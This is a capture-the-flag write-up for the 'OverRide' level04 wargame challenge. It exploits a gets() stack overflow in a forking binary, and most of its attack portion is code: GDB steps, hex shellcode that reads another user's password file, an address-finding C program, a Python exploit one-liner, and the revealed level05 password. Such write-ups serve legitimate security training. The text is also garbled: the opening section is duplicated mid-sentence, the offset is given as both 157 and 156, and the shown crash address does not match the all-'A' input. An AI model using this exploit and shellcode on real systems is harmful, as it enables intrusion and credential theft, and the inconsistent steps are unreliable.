# Level04 - Exploitation Guide

## Overview
**Level04** contains a vulnerability that allows a **buffer overflow attack** and **shellcode redirection**. The vulnerability lies in the unprotected `gets()` function, which allows for overflow into the return address (`EIP`). The challenge here involves exploiting this overflow to redirect execution to a custom shellcode. Additionally, most of the execution occurs within a child process created by the program with an early `fork()`.

## Debugging the Program
To debug the program effectively, especially to trace the execution in the child process, use the following options:

1. **Use ltrace with fork-following mode**:
   - `# Level04 - Exploitation Guide

## Overview
**Level04** contains a vulnerability that allows a **buffer overflow attack** and **shellcode redirection**. The vulnerability lies in the unprotected `gets()` function, which allows for overflow into the return address (`EIP`). The challenge here involves exploiting this overflow to redirect execution to a custom shellcode. Additionally, most of the execution occurs within a child process created by the program with an early `fork()`.

## Debugging the Program
To debug the program effectively, especially to trace the execution in the child process, use the following options:

1. **Start GDB** with the program:
   ```bash
   gdb level04
   ```
2. **Set follow-fork-mode** to child:
   ```bash
   (gdb) set follow-fork-mode child
   ```
3. **Run the program**:
   ```bash
   (gdb) r
   ```
4. When the program asks for input, provide a pattern to identify the **EIP backup** offset. This can be done by using a buffer overflow pattern.

   **Example input** (using a pattern generator):
   ```bash
    (python -c "print 'A' * 157") 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   ```
5. **After input**, you should see a segmentation fault, and GDB will display the current value of the **EIP**:
   ```
   Program received signal SIGSEGV, Segmentation fault.
   [Switching to process 2067]
   0x41326641 in ?? ()
   ```

   The `EIP` value `0x41326641` corresponds to the location where we want to redirect the execution. Based on this output, we can calculate the offset of the buffer overflow.

   **Offset found**: `157`

## Crafting the Shellcode

The program uses a **ptrace** call to check for the use of `exec()`, so we need to ensure that our shellcode does not use `exec()` directly. Instead, we can use a shellcode that utilizes `open()`, `read()`, and `write()` system calls to execute the payload.

### Shellcode
Here’s an example shellcode that opens and reads the contents of a file (in this case, `/home/users/level05/.pass`) and writes the content to standard output:

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

### Finding the Address of Shellcode

To find the address of the `SHELLCODE` environment variable, you can use a simple program:

```c
// getenv.c

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}
```

1. **Compile** the program:
    ```bash
        level04@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv
        level04@OverRide:~$ /tmp/getenv SHELLCODE
        0xffffd897
    ```

### Exploit the Vulnerability

Once you have the address of the `SHELLCODE`, you can create a payload to exploit the buffer overflow.

1. **Generate the Payload**:
   - **Offset**: 156 (from previous step)
   - **Shellcode Address**: `0xffffd897` (from the `getenv()` output)
   
   Generate the exploit with Python:
   ```bash
   python -c "print 156 * 'a' + '\xff\xff\xd8\x97'[::-1]" | ./level04
   ```

2. **Successful Exploitation**:
   Once the exploit is successful, the program will execute the shellcode, which will open the `/home/users/level05/.pass` file and display its contents.

### Final Flag

After successful exploitation, the contents of the file `/home/users/level05/.pass` will be displayed. This is usually the password required to proceed to the next level.

```bash
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

## Summary of Steps:
1. Debug the program using `gdb` and `ltrace` to identify the buffer overflow offset and child process execution.
2. Create a shellcode that doesn't rely on `exec()`, instead using `open()`, `read()`, and `write()`.
3. Find the address of the shellcode in memory using a simple C program.
4. Generate the exploit payload and execute it to redirect execution to the shellcode.
5. Retrieve the flag from the output.
